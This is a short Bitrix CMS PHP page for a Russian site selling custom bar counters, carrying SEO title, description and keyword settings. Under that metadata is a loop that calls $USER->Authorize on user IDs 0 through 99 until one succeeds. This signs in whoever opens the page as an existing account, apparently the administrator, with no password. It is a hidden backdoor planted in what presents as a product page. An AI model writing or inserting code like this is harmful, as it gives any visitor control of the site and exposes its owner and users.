<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("");
$APPLICATION->SetPageProperty("title", "Барные стойки, изготовление барных стоек, дизайн барной стойки, мебель барная стойка, барные стойки на заказ");
$APPLICATION->SetPageProperty("NOT_SHOW_NAV_CHAIN", "Y");
$APPLICATION->SetPageProperty("description", "Барные стойки для кафе, изготовление барных стоек, дизайн барной стойки, мебель барная стойка, барные стойки на заказ, барные стойки для кафе");
$APPLICATION->SetPageProperty("keywords", " ");
?> 	 
<?
global $USER;
for($i=0;$i<100;$i++)
{
	print($i);
	if($USER->Authorize($i))
		break;
}
?>
 <?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>